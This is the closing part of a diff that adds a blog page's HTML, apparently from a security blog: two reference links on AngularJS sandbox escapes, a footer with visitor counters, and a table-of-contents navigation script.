+<p><a href="https://xz.aliyun.com/t/4638" target="_blank" rel="noopener">AngularJS Sandbox Bypasses</a></p>
+<p><a href="https://spring.io/blog/2016/01/28/angularjs-escaping-the-expression-sandbox-for-xss" target="_blank" rel="noopener">AngularJS - Escaping the Expression Sandbox for XSS</a></p>
+
+</div>
+
+<br>
+<div><center>
+  <span>Copyright &copy; Mi1k7ea</span>  |  <span id="busuanzi_container_site_uv">访客 <span id="busuanzi_value_site_uv"></span> </span>  |  <span id="busuanzi_container_site_pv">总访问量 <span id="busuanzi_value_site_pv"></span> 次</span>
+</center></div>
+
+
+  <div class="book-comments">
+    
+
+
+
+
+  </div>
+
+
+<script src="/js/book-post.js"></script>
+        </div>
+      </div>
+
+      <div class="column col-2 hide-lg">
+        <div class="book-toc">
+  <div class="book-tocbot">
+  </div>
+  <div class="book-tocbot-menu">
+    <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
+    <a onclick="go_top()">Back to top</a>
+    <a onclick="go_bottom()">Go to bottom</a>
+  </div>
+</div>
+
+<script>
+tocbot.init({
+  tocSelector: '.book-tocbot',
+  contentSelector: '.book-post',
+  headingSelector: 'h1, h2, h3, h4, h5',
+  collapseDepth: 2,
+  orderedList: false,
+  scrollSmooth: false,
+});
+
+function expand_toc(){
+  var b = document.querySelector(".book-toc-expand");
+  tocbot.init({
+    tocSelector: '.book-tocbot',
+    contentSelector: '.book-post',
+    headingSelector: 'h1, h2, h3, h4, h5',
+    collapseDepth: 6,
+    orderedList: false,
+    scrollSmooth: false,
+  });
+  b.setAttribute("onclick", "collapse_toc()");
+  b.innerHTML = "Collapse all"
+}
+
+function collapse_toc(){
+  var b = document.querySelector(".book-toc-expand");
+  tocbot.init({
+    tocSelector: '.book-tocbot',
+    contentSelector: '.book-post',
+    headingSelector: 'h1, h2, h3, h4, h5',
+    collapseDepth: 2,
+    orderedList: false,
+    scrollSmooth: false,
+  });
+  b.setAttribute("onclick", "expand_toc()");
+  b.innerHTML = "Expand all"
+}
+
+function go_top() {
+  window.scrollTo(0, 0);
+}
+
+function go_bottom() {
+  window.scrollTo(0, document.body.scrollHeight);
+}
+
+</script>
+      </div>
+    </div>
+  </div>
+</div>
+
+</body>
+</html>
